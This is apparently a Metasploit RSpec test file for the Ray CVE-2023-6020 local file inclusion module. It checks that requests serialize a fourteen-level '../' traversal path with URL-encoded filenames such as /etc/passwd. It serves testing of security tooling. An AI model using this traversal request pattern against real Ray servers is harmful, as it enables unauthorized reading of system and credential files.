require 'rspec'
require 'msfenv'
require 'msf/core'

RSpec.describe 'Ray LFI filename request encoding' do
  subject(:mod) { owner_class.new }

  let(:owner_class) do
    scope = Module.new
    %i[CRASH_SAFE IOC_IN_LOGS Opt OptString].each { |name| scope.const_set(name, Msf.const_get(name)) }
    source = File.expand_path('../../../../modules/auxiliary/gather/ray_lfi_cve_2023_6020.rb', __dir__)
    scope.module_eval(File.read(source), source)
    scope.const_get(:MetasploitModule)
  end
  let(:client) { Rex::Proto::Http::Client.new('192.0.2.1', 8265) }
  let(:response) { Rex::Proto::Http::Response.new(200, 'OK') }
  let(:request_lines) { [] }
  let(:traversal) { '/static/js/' + ('../' * 14) }

  before do
    # Keep the real HttpClient path joining and Rex request serializer; only
    # connection establishment and the server response are transport boundaries.
    allow(mod).to receive(:connect).and_return(client)
    allow(mod).to receive(:disconnect)
    allow(client).to receive(:send_recv) do |request, _timeout|
      request_lines << request.to_s.lines.first
      response
    end
  end

  {
    '/etc/passwd' => 'etc/passwd',
    # Ray 2.6.3 rejected the unchanged owner's literal space with HTTP 400.
    "/tmp/outside 'quoted' file.txt" => 'tmp/outside%20%27quoted%27%20file.txt',
    '/tmp/literal%2Fname.txt' => 'tmp/literal%252Fname.txt',
    '/tmp/file#fragment?query=value.txt' => 'tmp/file%23fragment%3fquery%3dvalue.txt',
    '/tmp/café-漢字.txt' => 'tmp/caf%c3%a9-%e6%bc%a2%e5%ad%97.txt',
    '/tmp/plus+sign.txt' => 'tmp/plus%2bsign.txt'
  }.each do |filepath, encoded_path|
    it "serializes the exact filename bytes for #{filepath.inspect}" do
      mod.lfi(filepath)

      expect(request_lines).to eq(["GET #{traversal}#{encoded_path} HTTP/1.1\r\n"])
    end
  end

  it 'retains the application subpath and literal traversal hierarchy' do
    mod.datastore['TARGETURI'] = '/ray/'
    mod.lfi('/tmp/nested/file name.txt')

    expect(request_lines).to eq(["GET /ray#{traversal}tmp/nested/file%20name.txt HTTP/1.1\r\n"])
  end

  it 'preserves the configured filename bytes and encoding tag' do
    filepath = '/tmp/café%2F#?.txt'.b
    original = filepath.dup
    mod.lfi(filepath)

    expect([filepath.bytes, filepath.encoding]).to eq([original.bytes, original.encoding])
  end
end
